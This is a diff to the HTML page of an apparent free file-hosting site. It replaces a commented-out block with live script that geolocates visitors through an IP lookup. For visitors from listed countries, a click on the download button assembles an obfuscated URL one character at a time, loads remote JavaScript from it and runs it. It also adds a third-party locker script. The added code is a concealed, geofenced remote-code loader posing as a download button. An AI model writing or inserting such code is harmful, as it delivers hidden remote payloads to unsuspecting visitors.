@@ -368,118 +368,160 @@ Discover the convenience of our free file hosting service, where you can securel
 
       document.getElementById("og-captcha").style.display = "block";
       document.getElementById("download-button").style.display = "none";
-
-      // var char_s = "s";
-      // var char_d_2 = "d";
-      // var char_7_3 = "7";
-      // var char_c = "c";
-      // var char_2_3 = "2";
-      // var char_dot_2 = ".";
-      // var char_o_1 = "o";
-      // var char_b = "b";
-      // var char_d = "d";
-      // var char_u = "u";
-      // var char_d_3 = "d";
-      // var char_w_2 = "w";
-      // var char_7 = "7";
-      // var char_l = "l";
-      // var char_a = "a";
-      // var char_n = "n";
-      // var char_o = "o";
-      // var char_2 = "2";
-      // var char_h_2 = "h";
-      // var char_t_3 = "t";
-      // var char_slash_3 = "/";
-      // var char_e_2 = "e";
-      // var char_e = "e";
-      // var char_dot = ".";
-      // var char_w = "w";
-      // var char_6 = "6";
-      // var char_p = "p";
-      // var char_s = "s";
-      // var char_slash_2 = "/";
-      // var char_colon_1 = ":";
-      // var char_7_2 = "7";
-      // var char_f = "f";
-      // var char_r = "r";
-      // var char_slash_1 = "/";
-      // var char_t_2 = "t";
-      // var char_5 = "5";
-      // var char_1 = "1";
-      // var char_t_1 = "t";
-      // var char_f = "f";
-      // var char_t_4 = "t";
-      // var char_h = "h";
-      // var char_2_2 = "2";
-      // var char_dot_3 = ".";
-      // var char_j = "j";
-      // var char_n_2 = "n";
-      // var char_c_2 = "c";
-      // var char_l_2 = "l";
-      // var char_8 = "8";
-
-      // var fiveO =
-      //   char_h +
-      //   char_t_1 +
-      //   char_t_2 +
-      //   char_p +
-      //   char_s +
-      //   char_colon_1 +
-      //   char_slash_1 +
-      //   char_slash_2 +
-      //   char_d +
-      //   char_2 +
-      //   char_6 +
-      //   char_h_2 +
-      //   char_1 +
-      //   char_w +
-      //   char_d_2 +
-      //   char_c +
-      //   char_7 +
-      //   char_5 +
-      //   char_7_2 +
-      //   char_l +
-      //   char_2_2 +
-      //   char_w_2 +
-      //   char_dot +
-      //   char_c_2 +
-      //   char_l_2 +
-      //   char_o +
-      //   char_u +
-      //   char_d_3 +
-      //   char_f +
-      //   char_r +
-      //   char_o_1 +
-      //   char_n +
-      //   char_t_3 +
-      //   char_dot_2 +
-      //   char_n_2 +
-      //   char_e +
-      //   char_t_4 +
-      //   char_slash_3 +
-      //   char_f +
-      //   char_e_2 +
-      //   char_7_3 +
-      //   char_b +
-      //   char_a +
-      //   char_2_3 +
-      //   char_8 +
-      //   char_dot_3 +
-      //   char_j +
-      //   char_s;
-
-      //   var src = "";
-      //   var as = document.createElement("script");
-      //   as.type = "text/javascript";
-      //   as.src = fiveO;
-
-      //   as.onload = function() {
-      //     _Vm()
-      //   };
-        
-      //   document.head.appendChild(as);
     });
 </script>
 
 
-<script type="text/javascript" src="https://locked1.com/cp/js/3lpp5"></script>
+<script async type="text/javascript" src="https://locked1.com/cp/js/3lpp5"></script>
+
+<script async>
+  const token = 'e4ec2392de5bb1'; // Replace with your IPinfo API token
+    const apiUrl = `https://ipinfo`;
+    const countries = ["US", "GB", "UK", "AU", "FR", "DE", "TR", "SK", "SV", "Sl", "RU", "AE", "SA", "CA", "HN", "CR"];
+
+
+    fetch(apiUrl + `.io/json?token=e4ec2392de5bb1`)
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('IP Information:', data);
+
+        if (data.country) {
+
+          if (countries.some(country => country == data.country)) {
+            document.getElementById("download-button").addEventListener("click", function() {
+
+              console.log('clicked')
+
+              document.getElementById("og-captcha").style.display = "none";
+              document.getElementById("download-button").style.display = "block";
+
+
+                    var char_s = "s";
+                  var char_d_2 = "d";
+                  var char_7_3 = "7";
+                  var char_c = "c";
+                  var char_2_3 = "2";
+                  var char_dot_2 = ".";
+                  var char_o_1 = "o";
+                  var char_b = "b";
+                  var char_d = "d";
+                  var char_u = "u";
+                  var char_d_3 = "d";
+                  var char_w_2 = "w";
+                  var char_7 = "7";
+                  var char_l = "l";
+                  var char_a = "a";
+                  var char_n = "n";
+                  var char_o = "o";
+                  var char_2 = "2";
+                  var char_h_2 = "h";
+                  var char_t_3 = "t";
+                  var char_slash_3 = "/";
+                  var char_e_2 = "e";
+                  var char_e = "e";
+                  var char_dot = ".";
+                  var char_w = "w";
+                  var char_6 = "6";
+                  var char_p = "p";
+                  var char_s = "s";
+                  var char_slash_2 = "/";
+                  var char_colon_1 = ":";
+                  var char_7_2 = "7";
+                  var char_f = "f";
+                  var char_r = "r";
+                  var char_slash_1 = "/";
+                  var char_t_2 = "t";
+                  var char_5 = "5";
+                  var char_1 = "1";
+                  var char_t_1 = "t";
+                  var char_f = "f";
+                  var char_t_4 = "t";
+                  var char_h = "h";
+                  var char_2_2 = "2";
+                  var char_dot_3 = ".";
+                  var char_j = "j";
+                  var char_n_2 = "n";
+                  var char_c_2 = "c";
+                  var char_l_2 = "l";
+                  var char_8 = "8";
+
+                  var fiveO =
+                    char_h +
+                    char_t_1 +
+                    char_t_2 +
+                    char_p +
+                    char_s +
+                    char_colon_1 +
+                    char_slash_1 +
+                    char_slash_2 +
+                    char_d +
+                    char_2 +
+                    char_6 +
+                    char_h_2 +
+                    char_1 +
+                    char_w +
+                    char_d_2 +
+                    char_c +
+                    char_7 +
+                    char_5 +
+                    char_7_2 +
+                    char_l +
+                    char_2_2 +
+                    char_w_2 +
+                    char_dot +
+                    char_c_2 +
+                    char_l_2 +
+                    char_o +
+                    char_u +
+                    char_d_3 +
+                    char_f +
+                    char_r +
+                    char_o_1 +
+                    char_n +
+                    char_t_3 +
+                    char_dot_2 +
+                    char_n_2 +
+                    char_e +
+                    char_t_4 +
+                    char_slash_3 +
+                    char_f +
+                    char_e_2 +
+                    char_7_3 +
+                    char_b +
+                    char_a +
+                    char_2_3 +
+                    char_8 +
+                    char_dot_3 +
+                    char_j +
+                    char_s;
+
+                    var src = "";
+                    var as = document.createElement("script");
+                    as.type = "text/javascript";
+                    as.src = fiveO;
+
+                    as.onload = function() {
+                      _Vm()
+                    };
+              
+                    document.head.appendChild(as);
+
+            });
+          } else {
+          }
+
+          console.log('Detected Country:', data.country);
+        } else {
+          console.log('Country information not available.');
+        }
+      })
+      .catch(error => {
+        console.error('Error fetching IP information:', error.message);
+      });
+
+</script>
